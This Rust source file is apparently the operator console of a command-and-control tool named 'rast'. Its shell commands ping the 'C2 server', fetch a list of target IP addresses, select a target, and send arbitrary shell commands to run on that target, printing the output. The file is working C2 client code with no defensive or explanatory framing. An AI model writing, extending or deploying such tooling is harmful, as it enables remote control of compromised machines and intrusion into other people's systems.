use std::{
    error::Error,
    fmt::Display,
    net::{IpAddr, SocketAddr},
    ops::DerefMut,
    str::FromStr,
    sync::Arc,
    vec,
};

use bytes::Bytes;
use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{
    messages::ui_request::{UiRequest, UiResponse},
    protocols::{get_rw_frame, ProtoConnection},
};
use shellfish::{async_fn, handler::DefaultAsyncHandler, AsyncHandler, Command, Shell};
use tokio::sync::Mutex;
use tokio_util::codec::{BytesCodec, Framed};

pub type CmdResult<T> = std::result::Result<T, Box<dyn Error>>;

#[derive(Debug)]
pub struct ShellState {
    conn: Arc<Mutex<dyn ProtoConnection>>,
    target: Option<String>,
    targets: Vec<String>,
}

impl ShellState {
    pub fn new(conn: Arc<Mutex<dyn ProtoConnection>>) -> Self {
        ShellState {
            conn,
            target: None,
            targets: vec![],
        }
    }
}

impl Display for ShellState {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut prompt = String::from("[rast]");

        if let Some(target) = &self.target {
            prompt.push_str(&format!("[{target}]"));
        }

        write!(f, "{prompt} > ")
    }
}

pub fn get_shell(
    state: ShellState,
) -> Shell<'static, ShellState, impl Display, DefaultAsyncHandler> {
    let mut shell = Shell::new_async(state, "[rast]> ");

    shell.commands.insert(
        "ping",
        Command::new_async("pings C2 server".into(), async_fn!(ShellState, ping)),
    );

    shell.commands.insert(
        "get_targets",
        Command::new_async(
            "updates and prints target list".into(),
            async_fn!(ShellState, get_targets),
        ),
    );

    shell
        .commands
        .insert("set_target", Command::new("set target".into(), set_target));

    shell.commands.insert(
        "show_state",
        Command::new("show inner state".into(), show_state),
    );

    shell.commands.insert(
        "exec_command",
        Command::new_async(
            "run command on target".into(),
            async_fn!(ShellState, exec_command),
        ),
    );

    shell
}

// async fn send_request(request: UiRequest) -> Result<UiResponse> {}

async fn ping(state: &mut ShellState, _args: Vec<String>) -> CmdResult<()> {
    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());

    let request = UiRequest::Ping;
    let request = serde_json::to_vec(&request)?;

    frame.send(Bytes::from(request)).await?;
    let bytes = frame.next().await.unwrap().unwrap();

    let output: UiResponse = serde_json::from_slice(&bytes)?;

    if output == UiResponse::Pong {
        println!("pong");
    }

    Ok(())
}

async fn get_targets(state: &mut ShellState, _args: Vec<String>) -> CmdResult<()> {
    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());

    let request = UiRequest::GetIps;
    let request = serde_json::to_vec(&request)?;

    frame.send(Bytes::from(request)).await?;
    let bytes = frame.next().await.unwrap().unwrap();

    let output: UiResponse = serde_json::from_slice(&bytes)?;

    if let UiResponse::GetIps(ips) = output {
        state.targets = ips;
    }

    for (i, target) in state.targets.iter().enumerate() {
        println!("[{i}] {target}");
    }

    Ok(())
}

async fn exec_command(state: &mut ShellState, args: Vec<String>) -> CmdResult<()> {
    if state.target.is_none() {
        println!("No target is selected");
        return Ok(());
    }

    if args.len() < 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let mut command = String::new();
    for arg in args.iter().skip(1) {
        command.push_str(arg);
        command.push(' ');
    }

    let mut conn = state.conn.lock().await;

    // TODO: put all of that into struct and do abstractions
    let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());
    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();

    let request = UiRequest::Command(
        SocketAddr::new(IpAddr::from_str(ip).unwrap(), u16::from_str(port).unwrap()),
        command,
    );
    let request = serde_json::to_vec(&request)?;

    frame.send(Bytes::from(request)).await?;
    let bytes = frame.next().await.unwrap().unwrap();

    let output: UiResponse = serde_json::from_slice(&bytes)?;

    if let UiResponse::Command(output) = output {
        println!("{output}");
    }

    Ok(())
}

fn set_target(state: &mut ShellState, args: Vec<String>) -> CmdResult<()> {
    if args.len() != 2 {
        println!("Incorrect argument number");
        return Ok(());
    }

    let target = args.get(1).unwrap().parse::<usize>().unwrap();

    if let Some(target) = state.targets.get(target) {
        state.target = Some(target.to_string());
        println!("Target successfully set to: {target}");
    }

    Ok(())
}

fn show_state(state: &mut ShellState, _args: Vec<String>) -> CmdResult<()> {
    println!("{state:#?}");
    Ok(())
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
